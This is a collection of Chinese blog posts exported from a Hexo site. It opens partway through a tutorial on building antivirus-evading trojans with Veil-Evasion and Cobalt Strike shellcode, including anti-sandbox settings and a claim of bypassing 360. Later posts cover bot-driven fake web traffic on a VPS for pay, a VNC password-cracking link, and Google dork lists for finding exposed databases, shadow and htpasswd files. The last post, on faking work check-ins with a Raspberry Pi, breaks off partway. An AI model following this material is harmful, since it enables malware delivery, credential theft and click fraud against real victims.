<img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/veil2.png" alt="avatar"><br>查看payload<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] Available Payloads:</span><br><span class="line"></span><br><span class="line">	1)	autoit&#x2F;shellcode_inject&#x2F;flat.py</span><br><span class="line"></span><br><span class="line">	2)	auxiliary&#x2F;coldwar_wrapper.py</span><br><span class="line">	3)	auxiliary&#x2F;macro_converter.py</span><br><span class="line">	4)	auxiliary&#x2F;pyinstaller_wrapper.py</span><br><span class="line"></span><br><span class="line">	5)	c&#x2F;meterpreter&#x2F;rev_http.py</span><br><span class="line">	6)	c&#x2F;meterpreter&#x2F;rev_http_service.py</span><br><span class="line">	7)	c&#x2F;meterpreter&#x2F;rev_tcp.py</span><br><span class="line">	8)	c&#x2F;meterpreter&#x2F;rev_tcp_service.py</span><br><span class="line"></span><br><span class="line">	9)	cs&#x2F;meterpreter&#x2F;rev_http.py</span><br><span class="line">	10)	cs&#x2F;meterpreter&#x2F;rev_https.py</span><br><span class="line">	11)	cs&#x2F;meterpreter&#x2F;rev_tcp.py</span><br><span class="line">	12)	cs&#x2F;shellcode_inject&#x2F;base64.py</span><br><span class="line">	13)	cs&#x2F;shellcode_inject&#x2F;virtual.py</span><br><span class="line"></span><br><span class="line">	14)	go&#x2F;meterpreter&#x2F;rev_http.py</span><br><span class="line">	15)	go&#x2F;meterpreter&#x2F;rev_https.py</span><br><span class="line">	16)	go&#x2F;meterpreter&#x2F;rev_tcp.py</span><br><span class="line">	17)	go&#x2F;shellcode_inject&#x2F;virtual.py</span><br><span class="line"></span><br><span class="line">	18)	lua&#x2F;shellcode_inject&#x2F;flat.py</span><br><span class="line"></span><br><span class="line">	19)	perl&#x2F;shellcode_inject&#x2F;flat.py</span><br><span class="line"></span><br><span class="line">	20)	powershell&#x2F;meterpreter&#x2F;rev_http.py</span><br><span class="line">	21)	powershell&#x2F;meterpreter&#x2F;rev_https.py</span><br><span class="line">	22)	powershell&#x2F;meterpreter&#x2F;rev_tcp.py</span><br><span class="line">	23)	powershell&#x2F;shellcode_inject&#x2F;psexec_virtual.py</span><br><span class="line">	24)	powershell&#x2F;shellcode_inject&#x2F;virtual.py</span><br><span class="line"></span><br><span class="line">	25)	python&#x2F;meterpreter&#x2F;bind_tcp.py</span><br><span class="line">	26)	python&#x2F;meterpreter&#x2F;rev_http.py</span><br><span class="line">	27)	python&#x2F;meterpreter&#x2F;rev_https.py</span><br><span class="line">	28)	python&#x2F;meterpreter&#x2F;rev_tcp.py</span><br><span class="line">	29)	python&#x2F;shellcode_inject&#x2F;aes_encrypt.py</span><br><span class="line">	30)	python&#x2F;shellcode_inject&#x2F;arc_encrypt.py</span><br><span class="line">	31)	python&#x2F;shellcode_inject&#x2F;base64_substitution.py</span><br><span class="line">	32)	python&#x2F;shellcode_inject&#x2F;des_encrypt.py</span><br><span class="line">	33)	python&#x2F;shellcode_inject&#x2F;flat.py</span><br><span class="line">	34)	python&#x2F;shellcode_inject&#x2F;letter_substitution.py</span><br><span class="line">	35)	python&#x2F;shellcode_inject&#x2F;pidinject.py</span><br><span class="line">	36)	python&#x2F;shellcode_inject&#x2F;stallion.py</span><br><span class="line"></span><br><span class="line">	37)	ruby&#x2F;meterpreter&#x2F;rev_http.py</span><br><span class="line">	38)	ruby&#x2F;meterpreter&#x2F;rev_https.py</span><br><span class="line">	39)	ruby&#x2F;meterpreter&#x2F;rev_tcp.py</span><br><span class="line">	40)	ruby&#x2F;shellcode_inject&#x2F;base64.py</span><br><span class="line">	41)	ruby&#x2F;shellcode_inject&#x2F;flat.py</span><br></pre></td></tr></table></figure>
推荐使用以go和ruby语言encode的编码方式。像python这类的与用户有较高的交互就容易被查杀。</li>
</ul>
<h3 id="选择go语言stager"><a href="#选择go语言stager" class="headerlink" title="选择go语言stager"></a>选择go语言stager</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">Veil/Evasion&gt;: use <span class="number">17</span></span><br></pre></td></tr></table></figure>
<p>生成一个包含并执行CSpayload的go语言代码，和该代码编译成的可执行文件</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Required Options:</span><br><span class="line">Name            	Value   	Description</span><br><span class="line">----            	-----   	-----------</span><br><span class="line">BADMACS         	FALSE   	<span class="comment">#查看运行环境的MAC地址(反调试)</span></span><br><span class="line">CLICKTRACK      	X       	<span class="comment">#点击次数才会执行</span></span><br><span class="line">COMPILE_TO_EXE  	Y       	<span class="comment">#编译成exe文件</span></span><br><span class="line">CURSORCHECK     	FALSE   	<span class="comment">#设置硬盘容量(反沙盒)</span></span><br><span class="line">DISKSIZE        	X       	<span class="comment"># 设置只有磁盘大小满足时执行                           </span></span><br><span class="line">HOSTNAME        	X       	<span class="comment">#只有计算机名为hostname的值时才执行</span></span><br><span class="line">INJECT_METHOD   	Virtual 	<span class="comment">#Virtual or Heap</span></span><br><span class="line">MINPROCS        	X       	<span class="comment">#设置只有环境进程数满足时执行</span></span><br><span class="line">PROCCHECK       	FALSE   	<span class="comment">#只有运行环境的进程中没有虚拟机进程时才会执行payload（指定目标环境 反沙箱的方式）</span></span><br><span class="line">PROCESSORS      	X       	<span class="comment">#指定核心数的机器中才会执行payload（指定目标环境 反沙箱的方式）</span></span><br><span class="line">RAMCHECK        	FALSE   	<span class="comment">#只在运行环境的内存为3G以上时才会执行payload（指定目标环境 反沙箱的方式）</span></span><br><span class="line">SLEEP           	X       	<span class="comment">#休眠10秒 以检测是否运行过程中被加速（反沙箱)</span></span><br><span class="line">USERNAME        	X       	<span class="comment">#只有在当前用户名正确的机器中才执行payload</span></span><br><span class="line">USERPROMPT      	FALSE   	<span class="comment">#受害者计算机只有加入Comp域中时，才会执行payload（指定目标环境 反沙箱的方式）</span></span><br><span class="line">UTCCHECK        	Y   	 <span class="comment">#只在运行环境的系统使用UTC时间时，才会执行payload</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">[go/shellcode_inject/virtual&gt;&gt;]: generate </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-08%2007-45-55%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="avatar"></p>
<p>此时需要我们选择shellcode，我用cs生成</p>
<ul>
<li>Attacks -&gt; Packages -&gt; Payload Generator</li>
<li>Windows/beacon_http/reverse/http</li>
</ul>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-08%2007-52-01%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="avatar"></p>
<p>复制cs的payload到veil中<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-08%2008-07-41%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="avatar"></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">[<span class="meta">&gt;</span>] <span class="function">Please enter the <span class="keyword">base</span> name <span class="keyword">for</span> output <span class="title">files</span> (<span class="params"><span class="keyword">default</span> <span class="keyword">is</span> payload</span>): test</span></span><br><span class="line"><span class="function">生成木马</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-08%2008-10-20%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="avatar"><br>test.exe即为注入内存的免杀木马。</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/D1%5BX7%7E4%5B%258E%256L%7D%5DEQO%40SLX.png" alt="avatar"><br>卑微，只能过360，腾讯哈勃没过得去。正常用没问题<br>大家尽量不要用virustotal去做测试，这个会总合杀毒软件并将样本提交给杀毒软件。也就是说只能用一次。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>免杀，payload</tag>
      </tags>
  </entry>
  <entry>
    <title>懒人处理闲置vps__ubuntu16.04</title>
    <url>/2019/10/26/%E6%87%92%E4%BA%BA%E5%A4%84%E7%90%86%E9%97%B2%E7%BD%AEvps/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>今天刚好看b站，看到视频闲置的vps赚美刀。正好自己手里有闲置的阿里云Ecs，就趁机回收一下主机成本，也好久不碰vps了，上手试试。</p>
<a id="more"></a>

<hr>
<h2 id="0x01-关于平台"><a href="#0x01-关于平台" class="headerlink" title="0x01 关于平台"></a>0x01 关于平台</h2><p>Alexamaster，是一家通过全自动挂机刷Alexa排名的网站，通过浏览器可以自动冲浪上网挂机，起付金额最低1$,有PAYPAL即可，国内可挂。</p>
<p>Vagex 是刷 youtube 点击量的平台，支持最多 5 个 ip 挂同一个账号，即可以 5 台机器同时进行，平均每月赚 1-5 刀。</p>
<p>Ebesucher 是刷网站访问量的挂机平台，是一家德国的公司，用欧元支付。大约每月 1 欧左右。</p>
<p>一开始就接触的Alexamaster，下面都以它为例</p>
<hr>
<h2 id="0x02-Alexamaster注册"><a href="#0x02-Alexamaster注册" class="headerlink" title="0x02 Alexamaster注册"></a>0x02 Alexamaster注册</h2><p>无需翻墙<a href="https://www.alexamaster.net/a/my_profile.php">点击进入</a></p>
<p>填写资料，建议google邮箱。confire email可以在垃圾箱中找到。</p>
<p>注册之后找到挂机地址autosurf url</p>
<p>Earn Points - AutoSurf - how - copy autosurf url</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/D7AU56.png" alt="1"><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/X26ZAP_ALVVD_EJA.png" alt="2"></p>
<p>此时，在浏览器中打开网址就可挂机赚钱了。<br>如图<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/XUK.png"></p>
<h2 id="0x3-vps-ubuntu"><a href="#0x3-vps-ubuntu" class="headerlink" title="0x3 vps_ubuntu"></a>0x3 vps_ubuntu</h2><h4 id="安装VNC服务器并启用"><a href="#安装VNC服务器并启用" class="headerlink" title="安装VNC服务器并启用"></a>安装VNC服务器并启用</h4><figure class="highlight less"><table><tr><td class="code"><pre><span class="line">#阿里云服务器<span class="selector-tag">ubuntu</span> <span class="selector-tag">16</span><span class="selector-class">.04</span>版本</span><br><span class="line"><span class="selector-tag">root</span>@<span class="selector-tag">iZuf6cicjbwbqh7486tzi8Z</span>:~# <span class="selector-tag">apt-get</span> <span class="selector-tag">install</span> <span class="selector-tag">vnc4server</span>      # 安装<span class="selector-tag">VNC</span>服务器</span><br><span class="line"><span class="selector-tag">root</span>@<span class="selector-tag">iZuf6cicjbwbqh7486tzi8Z</span>:~# <span class="selector-tag">vncserver</span>    # 第一次运行<span class="selector-tag">vncserver</span>设置<span class="selector-tag">VNC</span>密码，看到类似 “<span class="selector-tag">New</span> ‘<span class="selector-pseudo">:1</span> ()’ <span class="selector-tag">desktop</span> <span class="selector-tag">is</span> <span class="selector-pseudo">:1</span> (代表主机名）” 的信息，即表示启动 vnc 成功</span><br><span class="line">root<span class="variable">@iZuf6cicjbwbqh7486tzi8Z</span>:~# <span class="attribute">vncserver </span>:<span class="number">1</span>    #开启端口<span class="number">5901</span></span><br><span class="line">root<span class="variable">@iZuf6cicjbwbqh7486tzi8Z</span>:~# ufw allow <span class="number">5901</span>    #阿里云防火墙开启端口并进行安全组进行设置</span><br></pre></td></tr></table></figure>
<h4 id="客户机中下载vnc-viewer"><a href="#客户机中下载vnc-viewer" class="headerlink" title="客户机中下载vnc viewer"></a>客户机中下载vnc viewer</h4><p>windows下载<a href="https://www.realvnc.com/download/file/viewer.files/VNC-Viewer-6.18.625-Windows.exe">vnc viewer</a></p>
<p>通过vps的ip+vnc的序号连接</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/5ZB%5D2L5B15L.png"></p>
<h4 id="配置完整的桌面VNC"><a href="#配置完整的桌面VNC" class="headerlink" title="配置完整的桌面VNC"></a>配置完整的桌面VNC</h4><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="comment">#连接上是一个空白的灰色屏幕，因为服务器的桌面进程尚未启动</span></span><br><span class="line"></span><br><span class="line">root<span class="variable">@iZuf6cicjbwbqh7486tzi8Z</span><span class="symbol">:~</span><span class="comment"># vncserver -kill :1        #成功连接之后，再退出该连接。关闭VNC服务：</span></span><br><span class="line">root<span class="variable">@iZuf6cicjbwbqh7486tzi8Z</span><span class="symbol">:~</span><span class="comment"># apt-get install --no-install-recommends ubuntu-desktop gnome-panel gnome-settings-daemon metacity nautilus gnome-terminal -y       #安装并使用 unity 桌面，这里仅安装核心组件(精简够用) /完整版桌面：apt install ubuntu-desktop gnome-panel gnome-settings-daemon metacity nautilus gnome-terminal -y</span></span><br><span class="line">root<span class="variable">@iZuf6cicjbwbqh7486tzi8Z</span><span class="symbol">:~</span><span class="comment"># cp ~/.vnc/xstartup ~/.vnc/xstartup.bak                  #备份原有 xstartup 文件</span></span><br><span class="line">root<span class="variable">@iZuf6cicjbwbqh7486tzi8Z</span><span class="symbol">:~</span><span class="comment"># vi ~/.vnc/xstartup</span></span><br><span class="line">配置修改如下图所示，红色部分</span><br><span class="line">root<span class="variable">@iZuf6cicjbwbqh7486tzi8Z</span><span class="symbol">:~</span><span class="comment"># vncserver :1    #保存并退出文件。重新启动VNC会话</span></span><br></pre></td></tr></table></figure>


<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/DUIHZCZ3.png"></p>
<h4 id="VNC服务器自启动"><a href="#VNC服务器自启动" class="headerlink" title="VNC服务器自启动"></a>VNC服务器自启动</h4><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@iZuf6cicjbwbqh7486tzi8Z</span><span class="symbol">:~</span><span class="comment"># crontab -e           #打开crontab，选择编译器4</span></span><br><span class="line"><span class="variable">@reboot</span> /usr/bin/vncserver <span class="symbol">:</span><span class="number">1</span>        <span class="comment">#添加到文件的底部</span></span><br><span class="line">保存并退出文件</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/671OU0W.png"></p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>windows下连上VNC Viewer，挂上自动冲浪网址<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/VB4I4SMZ%7B%7DH0%5DLN.png"></p>
<p>此时已经完成</p>
<h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><h5 id="firefox"><a href="#firefox" class="headerlink" title="firefox"></a>firefox</h5><ul>
<li>将浏览器更新到最新的Firefox，推荐Firefox</li>
<li>在浏览器中禁用弹出窗口阻止程序（必须启用JavaScript / Cookies </li>
<li>取消阻止内容阻止程序</li>
<li>安装Alexa浏览器扩展: alexa-com-toolbar</li>
<li>关闭 Firefox 的浏览记录</li>
<li>关闭 Firefox 安装提示 </li>
<li>国内挂了一会会让你重置ip，推荐使用vpn，浏览器设置代理。<a href="https://blog.csdn.net/CSDNhuaong/article/details/78273782">点击此处</a></li>
</ul>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#定时重启Firefox</span></span><br><span class="line">root@iZuf6cicjbwbqh7486tzi8Z:~<span class="comment"># crontab -e</span></span><br><span class="line"><span class="comment">#在结尾附加</span></span><br><span class="line"><span class="number">0</span> * * * * rm -rf <span class="regexp">/root/</span>.vnc<span class="regexp">/*.log &amp;&gt; /</span>dev/null</span><br><span class="line">*<span class="regexp">/20 * * * * killall -9 firefox &amp;&gt; /</span>dev/null</span><br><span class="line">*<span class="regexp">/20 * * * * sleep 30; export DISPLAY=:1; firefox &amp;&gt; /</span>dev/null</span><br></pre></td></tr></table></figure>

<h5 id="开启Swap空间"><a href="#开启Swap空间" class="headerlink" title="开启Swap空间"></a>开启Swap空间</h5><p>开启Swap虚拟内存</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">root@iZuf6cicjbwbqh7486tzi8Z<span class="symbol">:~</span><span class="comment"># swapon -s #查看当前是否开启Swap空间，结果为空则未开启</span></span><br><span class="line">root@iZuf6cicjbwbqh7486tzi8Z<span class="symbol">:~</span><span class="comment"># fallocate -l 2G /swapfile &amp;&amp; chmod 600 /swapfile &amp;&amp; mkswap /swapfile &amp;&amp; swapon /swapfile   #输入命令创建并启用 Swap 文件</span></span><br><span class="line">root@iZuf6cicjbwbqh7486tzi8Z<span class="symbol">:~</span><span class="comment"># vim /etc/fstab  #最后一行添加以下命令，设置开机自启</span></span><br><span class="line">/swapfile none swap defaults <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="comment">#删除Swap文件 </span></span><br><span class="line">root@iZuf6cicjbwbqh7486tzi8Z<span class="symbol">:~</span><span class="comment"># swapoff -a</span></span><br><span class="line">root@iZuf6cicjbwbqh7486tzi8Z<span class="symbol">:~</span><span class="comment"># rm -rf /swapfile</span></span><br></pre></td></tr></table></figure>



<p>推荐的一些github上一键部署脚本<br><a href="https://github.com/leitbogioro/Alexamaster-onkey-start">点击此处</a></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这里贴一下VNC Server命令</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#登陆</span></span><br><span class="line">root@iZuf6cicjbwbqh7486tzi8Z<span class="symbol">:~</span><span class="comment"># vncserver :2 设置客户端连接端口，一般端口号码在5901 ~ 5910 之间</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#停止</span></span><br><span class="line">root@iZuf6cicjbwbqh7486tzi8Z<span class="symbol">:~</span><span class="comment"># vncserver -kill :2 只能使用kill暴力杀除命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#同一个显示器可以连接多个客户机</span></span><br><span class="line">root@iZuf6cicjbwbqh7486tzi8Z<span class="symbol">:~</span><span class="comment"># vncserver -alwaysshared</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">root@iZuf6cicjbwbqh7486tzi8Z<span class="symbol">:~</span><span class="comment"># service vncserver restart</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重置密码</span></span><br><span class="line">root@iZuf6cicjbwbqh7486tzi8Z<span class="symbol">:~</span><span class="comment"># rm /root/.vnc/passwd    # 重新进行初次登陆的设置</span></span><br><span class="line"></span><br><span class="line">[破解vnc密码](<span class="symbol">https:</span>/<span class="regexp">/github.com/x</span>0rz4/vncpwd)</span><br><span class="line">点击[强化vnc server默认密码连接，免VNC端口(<span class="number">5901</span>)](<span class="symbol">https:</span>/<span class="regexp">/hakula.xyz/tutorial</span><span class="regexp">/vagex.html)</span></span><br><span class="line"><span class="regexp">#ssh隧道传输VNC，加密发送所有数据</span></span><br><span class="line"><span class="regexp">#SSH创建仅通过默认SSH端口（22）将本地端口5901上的localhost转发到远程计算机的端口5901的本地隧道</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>vps</category>
      </categories>
      <tags>
        <tag>vps</tag>
      </tags>
  </entry>
  <entry>
    <title>护网总结</title>
    <url>/2020/07/06/%E6%8A%A4%E7%BD%91%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>江苏省各市的护网都陆陆续续开始，自己也踩了一部分坑。这里做一个总结</p>
<a id="more"></a>

<hr>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>搜索引擎</title>
    <url>/2019/12/01/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>本篇要介绍的搜索引擎包括：Shodan，censys，钟馗之眼，Google，FoFa，Dnsdb等。介绍的内容主要是这几款搜索引擎的一些高级语法，掌握高级语法会让搜索结果更准确。</p>
<a id="more"></a>

<hr>
<h2 id="google基本语法"><a href="#google基本语法" class="headerlink" title="google基本语法"></a>google基本语法</h2><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">Index of/　　使用它可以直接进入网站首页下的所有文件和文件夹中。</span><br><span class="line">intext:　　将返回所有在网页正文部分包含关键词的网页。</span><br><span class="line">intitle:　　将返回所有网页标题中包含关键词的网页。</span><br><span class="line">cache:　　搜索google里关于某些内容的缓存。</span><br><span class="line">define:　　搜索某个词语的定义。</span><br><span class="line">filetype:　　搜索指定的文件类型，如：.bak，.mdb，.inc等。</span><br><span class="line">info:　　查找指定站点的一些基本信息。</span><br><span class="line">inurl:　　搜索我们指定的字符是否存在于URL中。</span><br><span class="line">Link:　　link:thief.one可以返回所有和thief.one做了链接的URL。</span><br><span class="line">site:　　site:thief.one将返回所有和这个站有关的URL。</span><br></pre></td></tr></table></figure>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">+　　把google可能忽略的字列如查询范围。</span><br><span class="line">-　　把某个字忽略，例子：新加 -坡。</span><br><span class="line">~　　同意词。</span><br><span class="line">.　　单一的通配符。</span><br><span class="line">*　　通配符，可代表多个字母。</span><br><span class="line">“”　　精确查询。</span><br></pre></td></tr></table></figure>
<h4 id="搜索不同国家网站"><a href="#搜索不同国家网站" class="headerlink" title="搜索不同国家网站"></a>搜索不同国家网站</h4><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">inurl:</span>tw　　台湾</span><br><span class="line"><span class="symbol">inurl:</span>jp　　日本</span><br><span class="line">利用google暴库</span><br><span class="line">利用goole可以搜索到互联网上可以直接下载到的数据库文件，语法如下：</span><br></pre></td></tr></table></figure>

<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="attr">inurl:</span>editor<span class="regexp">/db/</span> </span><br><span class="line"><span class="attr">inurl:</span>eWebEditor<span class="regexp">/db/</span> </span><br><span class="line"><span class="attr">inurl:</span>bbs<span class="regexp">/data/</span> </span><br><span class="line"><span class="attr">inurl:</span>databackup/ </span><br><span class="line"><span class="attr">inurl:</span>blog<span class="regexp">/data/</span> </span><br><span class="line"><span class="attr">inurl:</span>\boke\data </span><br><span class="line"><span class="attr">inurl:</span>bbs<span class="regexp">/database/</span> </span><br><span class="line"><span class="attr">inurl:</span>conn.asp </span><br><span class="line">inc/conn.asp</span><br><span class="line">Server.mapPath(“.mdb”)</span><br><span class="line"><span class="attr">allinurl:</span>bbs data</span><br><span class="line"><span class="attr">filetype:</span>mdb <span class="attr">inurl:</span>database</span><br><span class="line"><span class="attr">filetype:</span>inc conn</span><br><span class="line"><span class="attr">inurl:</span>data <span class="attr">filetype:</span>mdb</span><br><span class="line"><span class="attr">intitle:</span><span class="string">&quot;index of&quot;</span> data</span><br></pre></td></tr></table></figure>
<h4 id="利用goole搜索敏感信息"><a href="#利用goole搜索敏感信息" class="headerlink" title="利用goole搜索敏感信息"></a>利用goole搜索敏感信息</h4><p>利用google可以搜索一些网站的敏感信息，语法如下:</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">intitle:<span class="string">&quot;index of&quot;</span> etc</span><br><span class="line">intitle:<span class="string">&quot;Index of&quot;</span> .sh_history</span><br><span class="line">intitle:<span class="string">&quot;Index of&quot;</span> .bash_history</span><br><span class="line">intitle:<span class="string">&quot;index of&quot;</span> passwd</span><br><span class="line">intitle:<span class="string">&quot;index of&quot;</span> people.lst</span><br><span class="line">intitle:<span class="string">&quot;index of&quot;</span> pwd.db</span><br><span class="line">intitle:<span class="string">&quot;index of&quot;</span> etc/shadow</span><br><span class="line">intitle:<span class="string">&quot;index of&quot;</span> spwd</span><br><span class="line">intitle:<span class="string">&quot;index of&quot;</span> master.passwd</span><br><span class="line">intitle:<span class="string">&quot;index of&quot;</span> htpasswd</span><br><span class="line">inurl:service.pwd</span><br><span class="line">利用google搜索C段服务器信息</span><br><span class="line">此技巧来自lostwolf</span><br></pre></td></tr></table></figure>
<p>1<br>site:218.87.21.*<br>可通过google可获取218.87.21.0/24网络的服务信息。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>搜索引擎</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派打卡签到</title>
    <url>/2019/12/13/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%89%93%E5%8D%A1%E7%AD%BE%E5%88%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>实习要求：上班和下班必须要签到。我这么懒，实习是肯定要实习的，但是签到嘛，还是要想办法摸摸鱼的啦!</p>
<a id="more"></a>

<hr>
<h2 id="树莓派介绍"><a href="#树莓派介绍" class="headerlink" title="树莓派介绍"></a>树莓派介绍</h2><p>树莓派是一款信用卡大小的超小型电脑</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/O28QLRC9U194I.png"></p>
<p>那么我们有个大胆的想法，能不能用树莓派实现打卡的心愿呢。好歹也是个计算机，对吧。</p>
<h2 id="树莓派的购买及组装"><a href="#树莓派的购买及组装" class="headerlink" title="树莓派的购买及组装"></a>树莓派的购买及组装</h2><p><a href="https://projects.raspberrypi.org/en/projects/raspberry-pi-setting-up/2">购买清单</a></p>
<p>就我实际的使用而言，必需品：一块主板，网线，3个散热片，外壳，电源，16g sd卡，读卡器。</p>
<p>组装部分 <a href="https://projects.raspberrypi.org/en/projects/raspberry-pi-setting-up/4">https://projects.raspberrypi.org/en/projects/raspberry-pi-setting-up/4</a></p>
<p>大家拿着自己的板子(树莓派4)对照着图找就好了</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/PJ3%252IPJ.png"></p>
<h4 id="装系统"><a href="#装系统" class="headerlink" title="装系统"></a>装系统</h4><p>我这里推荐大家装 <a href="https://www.raspberrypi.org/downloads/raspbian/">Raspbian Buster with desktop</a> 对于官网NOOBS系统我尝试过了，对于我们没有买显示器的而言，不友好，需要额外的操作。</p>
<p><strong>系统下载完成，就需要烧录</strong> 这里需要先SD卡格式化，使用 <a href="https://www.sdcard.org/downloads/formatter/index.html">SD Card Formatter</a>(支持windows和mac)</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/YMFTL%7BWDL%5BRD.png"></p>
<p>烧录系统到sd卡<br>这里使用win32Diskimager </p>
<p>链接：<a href="https://pan.baidu.com/s/1loQPydCsw9Cam8Us2CbpxQ">https://pan.baidu.com/s/1loQPydCsw9Cam8Us2CbpxQ</a><br>提取码：wiis<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<p>烧录完成，组装完成。设置ssh连接，最新的系统默认是未开启ssh，这里我们需要设置开启ssh。将SD卡连接到电脑上并打开，直接新建“SSH”文件（无后缀）即可</p>
<p>算了，接下来还有网线什么的连接。写起来太长，都还没到主菜。详细的设置大家可以参考<br><a href="https://blog.csdn.net/weixin_43895902/article/details/100919851#_142">https://blog.csdn.net/weixin_43895902/article/details/100919851#_142</a></p>
<p>就我出现的几个问题给大家说一下。</p>
<ul>
<li><ol>
<li>ssh连接，我是在学校里，学校网络比较复杂。我是电脑使用无线连接手机热点，树莓派和电脑网线连接。无线网开启共享给有线。cmd中arp-a查看分配的ip，一般树莓派默认是192.168.137.x 默认密码<br>raspberry 用户名 pi</li>
</ol>
</li>
<li><ol start="2">
<li>开启的vnc无法显示，这是因为你屏幕的分辨率问题，按教程修改就好</li>
</ol>
</li>
<li><ol start="3">
<li>自己的树莓派下载很慢，这时需要<a href="https://zhuanlan.zhihu.com/p/35017671">设置软件源</a></li>
</ol>
</li>
<li><ol start="4">
<li>不推荐大家使用swap分区，会有损sd卡的性能。装完系统默认是开启100mb的sd卡空间提供swap。</li>
</ol>
</li>
</ul>
<h2 id="主菜到了，树莓派签到功能"><a href="#主菜到了，树莓派签到功能" class="headerlink" title="主菜到了，树莓派签到功能"></a>主菜到了，树莓派签到功能</h2><p>树莓派直接放在公司里，有电有网，直接就能定位。除了让树莓派自动打卡，我还想让树莓派打卡完成之后给我发一封邮件。一步一步来</p>
<h3 id="设置邮件功能"><a href="#设置邮件功能" class="headerlink" title="设置邮件功能"></a>设置邮件功能</h3><p>配置msmtp和mutt自动发送邮件</p>
<blockquote>
<p>mutt: 是一个Linux下的邮件程序，Mutt 更像一个文件管理器，只不过它管理的是email<br>msmtp: 是Linux下一个非常简单易用的smtp客户端</p>
</blockquote>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">sudo apt install msmtp mutt</span><br></pre></td></tr></table></figure>

